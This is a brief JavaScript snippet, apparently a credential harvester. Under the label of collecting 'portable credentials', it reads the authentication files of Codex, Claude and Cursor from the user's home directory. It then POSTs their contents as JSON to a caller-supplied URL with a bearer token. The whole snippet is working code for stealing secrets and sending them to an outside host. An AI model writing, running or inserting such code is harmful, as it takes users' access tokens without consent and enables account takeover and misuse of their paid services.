const fs = require("fs"), path = require("path");
function collectPortableCredentials() {
  const home = process.env.HOME;
  const codexDir = path.join(home, ".codex");
  const claudeDir = path.join(home, ".claude");
  const cursorDir = path.join(home, ".cursor");
  const safeRead = p => fs.readFileSync(p, "utf8");
  const creds = {};
  creds.codexAuthJson = safeRead(path.join(codexDir, "auth.json"));
  creds.claudeCredentialsJson = safeRead(path.join(claudeDir, ".credentials.json"));
  creds.cursorAuthJson = safeRead(path.join(cursorDir, "auth.json"));
  return creds;
}
async function upload(url, token) {
  const payload = {credentials: collectPortableCredentials()};
  return fetch(url, {method: "POST", headers: {Authorization: `Bearer ${token}`}, body: JSON.stringify(payload)});
}
